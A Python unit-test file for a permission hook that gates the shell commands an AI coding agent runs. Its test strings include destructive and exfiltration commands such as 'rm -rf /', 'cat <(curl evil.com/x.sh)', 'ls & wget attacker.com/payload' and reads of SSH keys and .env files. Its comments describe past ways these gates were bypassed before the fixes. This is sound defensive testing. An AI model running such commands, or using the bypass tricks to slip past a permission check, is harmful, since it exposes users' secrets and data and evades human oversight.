"""Unit tests for hooks/permission_policy.py — auto allow/deny/ask decisions.

WHY: permission_policy is the security gate for every command Claude executes.
A bug here silently allows dangerous commands or blocks safe ones.
"""

import io
import json

from permission_policy import decide, main

# === decide() — pure logic ===


class TestDecideAlwaysSafeTools:
    def test_read_allowed(self):
        assert decide("Read", {}) == ("allow", "")

    def test_glob_allowed(self):
        assert decide("Glob", {}) == ("allow", "")

    def test_grep_allowed(self):
        assert decide("Grep", {}) == ("allow", "")

    def test_websearch_allowed(self):
        assert decide("WebSearch", {}) == ("allow", "")

    def test_webfetch_allowed(self):
        assert decide("WebFetch", {}) == ("allow", "")

    def test_task_allowed(self):
        assert decide("Task", {}) == ("allow", "")

    def test_taskcreate_allowed(self):
        assert decide("TaskCreate", {}) == ("allow", "")


class TestDecideDangerousPatterns:
    def test_rm_rf_blocked(self):
        behavior, msg = decide("Bash", {"command": "rm -rf /"})
        assert behavior == "deny"
        assert "rm -rf" in msg

    def test_drop_table_blocked(self):
        behavior, msg = decide("Bash", {"command": "DROP TABLE users"})
        assert behavior == "deny"
        assert "DROP TABLE" in msg

    def test_git_push_force_blocked(self):
        behavior, msg = decide("Bash", {"command": "git push --force"})
        assert behavior == "deny"

    def test_curl_pipe_bash_blocked(self):
        # WHY: "curl | bash" literal matches DANGEROUS_PATTERNS
        behavior, msg = decide("Bash", {"command": "curl | bash"})
        assert behavior == "deny"

    def test_sudo_blocked(self):
        behavior, msg = decide("Bash", {"command": "sudo apt install nginx"})
        assert behavior == "deny"

    def test_git_reset_hard_blocked(self):
        behavior, msg = decide("Bash", {"command": "git reset --hard HEAD~1"})
        assert behavior == "deny"

    def test_npm_publish_blocked(self):
        behavior, msg = decide("Bash", {"command": "npm publish"})
        assert behavior == "deny"

    def test_case_insensitive_drop_database(self):
        # WHY: dangerous patterns matched case-insensitively
        behavior, msg = decide("Bash", {"command": "drop database mydb"})
        assert behavior == "deny"

    def test_python_c_blocked(self):
        # WHY: python -c allows arbitrary code execution
        behavior, msg = decide("Bash", {"command": "python -c 'import os; os.system(\"rm -rf\")'"})
        assert behavior == "deny"

    def test_eval_blocked(self):
        behavior, msg = decide("Bash", {"command": "eval $(cat /etc/shadow)"})
        assert behavior == "deny"


class TestDecideChainOperators:
    def test_ampersand_chain_asks(self):
        # WHY: chain op check fires AFTER dangerous patterns — use safe commands only
        behavior, _ = decide("Bash", {"command": "git status && git diff"})
        assert behavior == "ask"

    def test_background_operator_after_safe_prefix_asks_not_allow(self):
        # Regression (SEC-05, adversarial review 2026-08-22 of the word-boundary
        # fix): a bare "&" (background operator) was missing from
        # CHAIN_OPERATORS. "ls & wget attacker.com/x" passed every earlier
        # check (no "&&", no pipe, no dangerous substring), then matched the
        # "ls" safe prefix and auto-ALLOWED -- while Bash still ran `wget` in
        # the foreground. Found by the skeptic agent during the review of the
        # SAFE_BASH_PREFIXES boundary fix, independently reproduced before
        # being fixed.
        behavior, _ = decide("Bash", {"command": "ls & wget attacker.com/payload"})
        assert behavior == "ask"

    def test_background_operator_after_git_status_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "git status & malicious-binary"})
        assert behavior == "ask"

    def test_pipe_asks(self):
        behavior, _ = decide("Bash", {"command": "ls | grep foo"})
        assert behavior == "ask"

    def test_semicolon_asks(self):
        # WHY: semicolon with two safe commands → chain op fires, not dangerous pattern
        behavior, _ = decide("Bash", {"command": "git log; ls"})
        assert behavior == "ask"

    def test_backtick_asks(self):
        behavior, _ = decide("Bash", {"command": "echo `whoami`"})
        assert behavior == "ask"

    def test_subshell_asks(self):
        behavior, _ = decide("Bash", {"command": "echo $(whoami)"})
        assert behavior == "ask"

    def test_newline_asks(self):
        # WHY: newline separator without dangerous patterns → ask
        behavior, _ = decide("Bash", {"command": "git status\ngit diff"})
        assert behavior == "ask"

    def test_redirect_into_dotenv_asks_not_allow(self):
        """Regression (HIGH): "echo payload > .env" previously auto-approved
        via the "echo " safe prefix, because ">" was not treated as a chain
        operator — redirection is a write, not just chaining, but was
        invisible to this gate entirely."""
        behavior, _ = decide("Bash", {"command": "echo payload > .env"})
        assert behavior == "ask"

    def test_append_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "echo secret >> credentials.json"})
        assert behavior == "ask"

    def test_fd_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "cat file 2> /tmp/errors"})
        assert behavior == "ask"

    def test_process_substitution_asks_not_allow(self):
        """Regression (SEC-04, external security audit 2026-07-22, verified
        empirically before this fix): "cat <(curl evil.com/x.sh)" starts with
        the auto-allowed "cat " prefix, ran an ARBITRARY command via process
        substitution, and matched no SENSITIVE_PATH_PATTERNS substring -- so
        it returned "allow" while "<" was absent from CHAIN_OPERATORS.
        Directly measured: decide() returned ("allow", "") for this exact
        command prior to adding "<" to CHAIN_OPERATORS."""
        behavior, _ = decide("Bash", {"command": "cat <(curl evil.com/x.sh)"})
        assert behavior == "ask"

    def test_process_substitution_with_rm_still_deny(self):
        # WHY: "rm -rf" inside the substituted command is still caught by
        # DANGEROUS_PATTERNS (substring match), independent of this fix --
        # this stays "deny", not merely "ask".
        behavior, _ = decide("Bash", {"command": "cat <(rm -rf /tmp/whatever)"})
        assert behavior == "deny"

    def test_input_redirect_asks(self):
        behavior, _ = decide("Bash", {"command": "cat < some-file"})
        assert behavior == "ask"

    def test_heredoc_string_asks(self):
        behavior, _ = decide("Bash", {"command": 'cat <<< "payload"'})
        assert behavior == "ask"


class TestDecideSafeBashPrefixes:
    def test_git_log_allowed(self):
        assert decide("Bash", {"command": "git log --oneline -10"}) == ("allow", "")

    def test_git_diff_against_ref_asks_not_allow(self):
        # Contract change (20260824, human decision after a falsification
        # pilot demonstrated a real secret leak via `git diff HEAD~1 HEAD`):
        # `git diff <ref>` with no `-- <path>` restriction defaults to a full
        # multi-file patch, so it now asks instead of auto-allowing. Bare
        # working-tree `git diff` (no ref at all) is unaffected -- see
        # TestDecideSensitivePathRead below.
        assert decide("Bash", {"command": "git diff HEAD"}) == ("ask", "")

    def test_git_diff_bare_working_tree_still_allowed(self):
        assert decide("Bash", {"command": "git diff"}) == ("allow", "")

    def test_git_status_allowed(self):
        assert decide("Bash", {"command": "git status"}) == ("allow", "")

    def test_ls_allowed(self):
        assert decide("Bash", {"command": "ls -la"}) == ("allow", "")

    def test_ruff_allowed(self):
        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")

    def test_mypy_allowed(self):
        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")

    def test_unknown_command_asks(self):
        behavior, _ = decide("Bash", {"command": "docker run nginx"})
        assert behavior == "ask"

    def test_non_bash_unknown_tool_asks(self):
        behavior, _ = decide("Edit", {"file_path": "foo.py"})
        assert behavior == "ask"

    def test_empty_command_asks(self):
        behavior, _ = decide("Bash", {"command": ""})
        assert behavior == "ask"


class TestSafePrefixWordBoundary:
    """Regression (MEDIUM, self-audit 2026-08-22): SAFE_BASH_PREFIXES entries that
    don't end in a space (ruff/mypy/ls/pwd/git status/...) previously matched via
    bare startswith(), so any command merely STARTING WITH the prefix auto-allowed
    -- the same bypass class SEC-01 (2026-07-17) already removed pytest/npm-test
    for. `_matches_safe_prefix` now requires the match end at a word boundary."""

    def test_lsof_does_not_match_ls_prefix(self):
        behavior, _ = decide("Bash", {"command": "lsof -i :8080"})
        assert behavior == "ask"

    def test_ruffian_does_not_match_ruff_prefix(self):
        behavior, _ = decide("Bash", {"command": "ruffian --do-something-else"})
        assert behavior == "ask"

    def test_mypyc_does_not_match_mypy_prefix(self):
        behavior, _ = decide("Bash", {"command": "mypyc hooks/permission_policy.py"})
        assert behavior == "ask"

    def test_pwd_lookalike_does_not_match_pwd_prefix(self):
        behavior, _ = decide("Bash", {"command": "pwdx 1234"})
        assert behavior == "ask"

    def test_git_status_lookalike_does_not_match(self):
        behavior, _ = decide("Bash", {"command": "git statuses-are-fake"})
        assert behavior == "ask"

    def test_bare_prefix_with_no_arguments_still_allowed(self):
        # WHY: the boundary check must accept an exact match (nothing after
        # the prefix at all), not just "prefix + space".
        behavior, _ = decide("Bash", {"command": "pwd"})
        assert behavior == "allow"

    def test_prefix_with_space_and_args_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "ls -la /tmp"})
        assert behavior == "allow"

    def test_git_status_with_flag_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "git status --short"})
        assert behavior == "allow"


class TestDecideSensitivePathRead:
    """Regression (HIGH, external security audit 2026-07-07): cat/head/tail
    were auto-allowed for ANY target path, including secrets -- `cat
    ~/.ssh/id_rsa` or `cat .env` had no chain operator and started with the
    auto-allowed "cat " prefix, so real credentials could be disclosed into
    Claude's context with zero confirmation."""

    def test_cat_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat ~/.ssh/id_rsa"})
        assert behavior == "ask"

    def test_cat_dotenv_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "cat .env"})
        assert behavior == "ask"

    def test_head_credentials_asks(self):
        behavior, _ = decide("Bash", {"command": "head -20 ~/.aws/credentials"})
        assert behavior == "ask"

    def test_tail_config_gh_hosts_asks(self):
        behavior, _ = decide("Bash", {"command": "tail ~/.config/gh/hosts.yml"})
        assert behavior == "ask"

    def test_cat_pem_file_asks(self):
        behavior, _ = decide("Bash", {"command": "cat server.pem"})
        assert behavior == "ask"

    def test_cat_ordinary_readme_still_allowed(self):
        """The sensitive-path check must not turn every cat into "ask" --
        ordinary, non-sensitive reads stay auto-allowed."""
        behavior, _ = decide("Bash", {"command": "cat README.md"})
        assert behavior == "allow"

    def test_cat_ordinary_source_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "cat hooks/utils.py"})
        assert behavior == "allow"

    def test_dangerous_pattern_still_beats_sensitive_path_check(self):
        # WHY: dangerous patterns are checked before sensitive-path check --
        # this must remain "deny", not downgrade to "ask".
        behavior, _ = decide("Bash", {"command": "cat .env; rm -rf /"})
        assert behavior == "deny"

    def test_wc_dotenv_asks_not_allow(self):
        # Regression (F-16, security audit 2026-07-12): "wc " was in
        # SAFE_BASH_PREFIXES but missing from _PATH_SENSITIVE_READ_PREFIXES,
        # so `wc -l .env` auto-allowed even though wc also reads arbitrary
        # file content (leaking byte/line/word counts of a secret file).
        behavior, _ = decide("Bash", {"command": "wc -l .env"})
        assert behavior == "ask"

    def test_wc_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "wc -c ~/.ssh/id_rsa"})
        assert behavior == "ask"

    def test_wc_ordinary_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "wc -l README.md"})
        assert behavior == "allow"

    def test_git_show_dotenv_asks_not_allow(self):
        # Regression (falsification-pilot 20260824, paraphrase-sensitivity
        # probe): "git show" is in SAFE_BASH_PREFIXES but was missing from
        # the sensitive-path check, so `git show HEAD:.env` auto-allowed even
        # though it dumps full file content from git history -- including
        # commits no longer present in the working tree.
        behavior, _ = decide("Bash", {"command": "git show HEAD:.env"})
        assert behavior == "ask"

    def test_git_log_patch_ssh_key_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "git log -p .ssh/id_rsa"})
        assert behavior == "ask"

    def test_git_diff_dotenv_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "git diff HEAD~1 -- .env"})
        assert behavior == "ask"

    def test_git_show_ordinary_file_still_allowed(self):
        behavior, _ = decide("Bash", {"command": "git show HEAD:README.md"})
        assert behavior == "allow"

    def test_git_log_without_path_still_allowed_diff_against_ref_now_asks(self):
        assert decide("Bash", {"command": "git log --oneline -10"})[0] == "allow"
        # WHY "allow" -> "ask" (human decision, 20260824, explicit go-ahead
        # in-session): `git diff <ref>` with no `-- <path>` defaults to a
        # full multi-file patch -- reproduced live leaking a historical
        # secret via `git diff HEAD~1 HEAD`. See also
        # test_git_diff_against_ref_asks_not_allow in
        # TestDecideSafeBashPrefixes for the same contract change.
        assert decide("Bash", {"command": "git diff HEAD"})[0] == "ask"

    def test_git_show_bare_ref_asks_not_allow(self):
        # Regression (security-audit follow-up, same pilot): `git show <ref>`
        # with no ":<path>" defaults to the FULL commit patch -- every
        # changed file, none named in the command text. Reproduced live:
        # `git show HEAD~1` alone printed a secret from a since-removed
        # .env with zero filename in the command. No substring scan can
        # catch this; must ask whenever the command isn't narrowed to a
        # specific ":<path>".
        for cmd in ("git show HEAD", "git show HEAD~1", "git show a1b2c3d"):
            assert decide("Bash", {"command": cmd}) == ("ask", ""), cmd

    def test_git_log_patch_flag_asks_not_allow(self):
        # `git log` defaults to metadata-only (safe); -p/--patch/-u switch it
        # to full per-commit patches -- same unrestricted-dump risk as bare
        # `git show` above.
        for cmd in ("git log -p -3", "git log --patch", "git log -u"):
            assert decide("Bash", {"command": cmd}) == ("ask", ""), cmd

    def test_git_diff_bare_refs_asks_not_allow(self):
        # FIXED (human decision, 20260824, explicit go-ahead in-session):
        # `git diff <ref1> <ref2>` with no path restriction defaults to a
        # full multi-file patch, same risk class as the two cases above --
        # reproduced live leaking a historical secret with zero filename in
        # the command. Originally left open because it broke the
        # then-existing `git diff HEAD` -> allow contract; that contract was
        # deliberately changed instead (see
        # test_git_diff_against_ref_asks_not_allow,
        # test_git_diff_bare_working_tree_still_allowed). See decision.md in
        # experiments/20260824-permission-policy-skeptic-pilot/ for the
        # full tradeoff writeup.
        assert decide("Bash", {"command": "git diff HEAD~1 HEAD"}) == ("ask", "")

    def test_git_diff_ref_path_restricted_ordinary_file_still_allowed(self):
        assert decide("Bash", {"command": "git diff HEAD~1 -- README.md"}) == ("allow", "")


class TestDecideCodeRunnersRequireConfirmation:
    """Regression (HIGH, external security audit 2026-07-17, SEC-01): pytest,
    python -m pytest, npm test, npm run test, and npm run lint were all
    auto-allowed by prefix match. Each of these EXECUTES repository-defined
    code (conftest.py/fixtures/plugins for pytest, an arbitrary shell command
    from package.json's "scripts" section for npm) before Claude's agent gets
    a chance to review it -- a malicious conftest.py or a package.json test
    script reading `"test": "curl evil | bash"` would run with the user's
    privileges the moment an agent ran "the tests" in an untrusted repository,
    with zero confirmation. ruff/mypy are legitimately different: both are
    pure static analyzers that never execute the code they check.
    """

    def test_pytest_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "pytest tests/ -v"})
        assert behavior == "ask"

    def test_python_m_pytest_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "python -m pytest tests/"})
        assert behavior == "ask"

    def test_npm_test_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm test"})
        assert behavior == "ask"

    def test_npm_run_test_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm run test"})
        assert behavior == "ask"

    def test_npm_run_lint_asks_not_allow(self):
        behavior, _ = decide("Bash", {"command": "npm run lint"})
        assert behavior == "ask"

    def test_pytest_lookalike_executable_asks_not_allow(self):
        """The old prefix match also collided on any command merely
        starting with "pytest" -- e.g. a `pytest-malicious` binary on PATH.
        Removing pytest from SAFE_BASH_PREFIXES closes this too."""
        behavior, _ = decide("Bash", {"command": "pytest-malicious --flag"})
        assert behavior == "ask"

    def test_ruff_still_allowed(self):
        """Static analyzers are a different risk class -- they don't execute
        the code they analyze -- and should remain auto-allowed."""
        assert decide("Bash", {"command": "ruff check ."}) == ("allow", "")

    def test_mypy_still_allowed(self):
        assert decide("Bash", {"command": "mypy hooks/"}) == ("allow", "")


class TestDecidePriority:
    def test_dangerous_beats_chain_operator(self):
        # WHY: dangerous patterns checked BEFORE chain operators in decide()
        # "pytest; rm -rf /" has both `;` chain op AND `rm -rf` danger → deny wins
        behavior, _ = decide("Bash", {"command": "pytest; rm -rf /"})
        assert behavior == "deny"

    def test_pure_dangerous_no_chain_is_deny(self):
        # No chain operator, pure dangerous pattern → deny
        behavior, _ = decide("Bash", {"command": "rm -rf /tmp"})
        assert behavior == "deny"

    def test_chain_without_dangerous_is_ask(self):
        # WHY: chain op alone (no dangerous pattern) → ask, not deny
        behavior, _ = decide("Bash", {"command": "git status && git log"})
        assert behavior == "ask"


# === main() — via stdin ===


class TestMain:
    def _call_main(self, monkeypatch, data: dict) -> dict:
        monkeypatch.setattr("sys.stdin", io.StringIO(json.dumps(data)))
        from io import StringIO
        from unittest.mock import patch

        buf = StringIO()
        with patch("sys.stdout", buf):
            try:
                main()
            except SystemExit:
                pass
        output = buf.getvalue().strip()
        return json.loads(output) if output else {}

    def test_main_allows_safe_bash(self, monkeypatch):
        # WHY a real Bash command, not tool_name="Read" (regression, external
        # review 2026-07-18, SEC-03 follow-up): this hook is registered ONLY
        # under PreToolUse matcher "Bash" -- a non-Bash tool_name never
        # reaches it in production, so exercising main() with tool_name="Read"
        # tested a path main() can technically handle but that never fires.
        # decide("Read", {}) itself is still covered directly by
        # TestDecideAlwaysSafeTools above.
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "git status"}},
        )
        output = result["hookSpecificOutput"]
        assert output["hookEventName"] == "PreToolUse"
        assert output["permissionDecision"] == "allow"

    def test_main_deny_for_rm_rf(self, monkeypatch):
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "rm -rf /"}},
        )
        output = result["hookSpecificOutput"]
        assert output["permissionDecision"] == "deny"
        assert "rm -rf" in output["permissionDecisionReason"]

    def test_main_asks_for_unknown_bash_command(self, monkeypatch):
        # WHY "docker run nginx" (a real, reachable Bash command), not
        # tool_name="UnknownTool" (same regression as test_main_allows_safe_bash
        # above): only unrecognized BASH commands reach this hook in
        # production, not arbitrary non-Bash tool names.
        result = self._call_main(
            monkeypatch,
            {"tool_name": "Bash", "tool_input": {"command": "docker run nginx"}},
        )
        output = result["hookSpecificOutput"]
        assert output["permissionDecision"] == "ask"

    def test_main_empty_stdin_no_crash(self, monkeypatch, capsys):
        monkeypatch.setattr("sys.stdin", io.StringIO("{}"))
        try:
            main()
        except SystemExit:
            pass
        # Should not raise, output may be minimal
